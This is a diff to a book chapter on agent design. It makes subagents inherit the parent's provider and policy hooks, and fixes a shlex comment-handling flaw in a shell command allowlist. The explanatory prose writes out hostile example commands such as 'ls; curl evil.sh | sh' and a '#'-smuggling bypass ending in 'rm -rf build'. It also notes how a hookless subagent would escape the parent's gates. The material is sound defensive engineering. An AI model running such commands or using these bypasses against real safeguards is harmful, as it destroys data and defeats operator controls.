@@ -295,16 +295,15 @@ The insight that keeps it small is that a subagent is just a tool whose implemen
 ```python
 # micro_agent/subagent.py
 from .agent import Agent
-from .provider import AnthropicProvider
 from .tools import ToolRegistry
 
 
-def make_subagent_tool(parent: Agent, provider: AnthropicProvider,
-                       name: str, system: str, sub_tools: ToolRegistry,
-                       description: str, max_turns: int = 10):
+def make_subagent_tool(parent: Agent, name: str, system: str,
+                       sub_tools: ToolRegistry, description: str,
+                       max_turns: int = 10):
     """Register a subagent as a callable tool on the parent's registry."""
     def _spawn(task: str) -> str:
-        agent = Agent(provider, sub_tools, system=system,
+        agent = Agent(parent.provider, sub_tools, system=system,
                       hooks=parent.hooks,                     # policy is inherited
                       transcript_dir=parent.transcript_dir,
                       max_turns=max_turns,
@@ -317,7 +316,8 @@ def make_subagent_tool(parent: Agent, provider: AnthropicProvider,
 
 Design notes.
 The subagent gets a fresh messages list (context isolation), its own registry (least privilege), and returns one string to the parent (the quarantine pattern from Chapter 02), and all three properties fall out of composition rather than new machinery.
-What does not fall out for free is policy, which is why the spawn takes the parent `Agent` rather than a bare registry.
+What does not fall out for free is policy, which is why the spawn takes the parent `Agent` rather than a bare registry and a provider.
+Taking the parent means there is one source of truth for everything the subagent inherits, and a second `provider` argument alongside it would be a way to spell "run this delegated work on a different model while claiming to inherit the parent's configuration", which is a bug in every case a caller would actually hit.
 Constructing the subagent without `hooks` gives it an empty `Hooks()`, and delegation then becomes the way around every gate you wrote: put a shell tool in `sub_tools` and the parent's allowlist never runs.
 Least privilege is about which tools the subagent holds, not about which rules apply to them, so the tool set narrows while the policy is inherited whole.
 Passing `parent_run_id` closes the matching gap in observability, because a delegated run that writes an unlinked JSONL file cannot answer "what did the model see" for the part of the work you most want to inspect.
@@ -368,6 +368,7 @@ def shell_operators(command: str) -> list[str]:
     if "\n" in command or "\r" in command:
         return ["newline"]      # shlex calls it whitespace; the shell does not
     lexer = shlex.shlex(command, punctuation_chars=True)
+    lexer.commenters = ""   # the shell starts a comment only at a word boundary
     lexer.whitespace_split = True
     try:
         tokens = list(lexer)
@@ -394,7 +395,7 @@ agent = Agent(provider, tools,
               hooks=Hooks(pre_tool=[command_allowlist]))
 
 research_tools = tools.share(ToolRegistry(), "read_file")   # read-only subset
-make_subagent_tool(agent, provider, name="research",
+make_subagent_tool(agent, name="research",
                    system="You investigate codebases and report findings tersely.",
                    sub_tools=research_tools,
                    description="Delegate a read-only research question about the codebase.")
@@ -406,6 +407,8 @@ The allowlist hook is small, and every one of its checks earns its place.
 `run_command` executes through a shell, so a prefix test on its own is not a policy: `ls; curl evil.sh | sh` and `cat notes.md && rm -rf build` both begin with an allowed word, and both would run.
 Rejecting shell operators first is what makes the prefix meaningful, and matching on a token boundary rather than a bare prefix is what stops `ls` from admitting `lsof` and `lsblk`.
 Finding those operators is a tokenizing problem rather than a substring problem, because a substring scan both misses a newline and falsely rejects `rg 'foo|bar'`, whose pipe is quoted and therefore literal.
+A borrowed tokenizer has to be corrected where its grammar differs from the shell's, and `shlex` differs in two places: it treats a line break as whitespace, which the check settles before tokenizing, and it treats `#` as a comment anywhere in the string, while the shell begins a comment only at a word boundary.
+Leaving `commenters` at its default is enough to lose the whole guard, because `cat notes.md#x && rm -rf build` then tokenizes to `cat notes.md` with no operators, passes the allowlist on `cat`, and runs both commands.
 The entries are subcommands rather than programs for the same reason: a bare `git` on the allowlist of a review agent also authorizes `git push`, `git reset --hard`, and `git clean -fdx`, which is why Volume 13 Chapter 07 names `git push` on its deny list, and naming the four read-only subcommands here settles the question in one place instead of two.
 `read_file` resolves before it reads, so the review agent and the research subagent it delegates to are both confined to the project, and neither can be talked into returning `~/.ssh/id_rsa` through the parent's context.
 Write it this way and the hook is policy as code; write it as a `startswith` over a tuple of program names and it is a suggestion with a `subprocess` behind it.
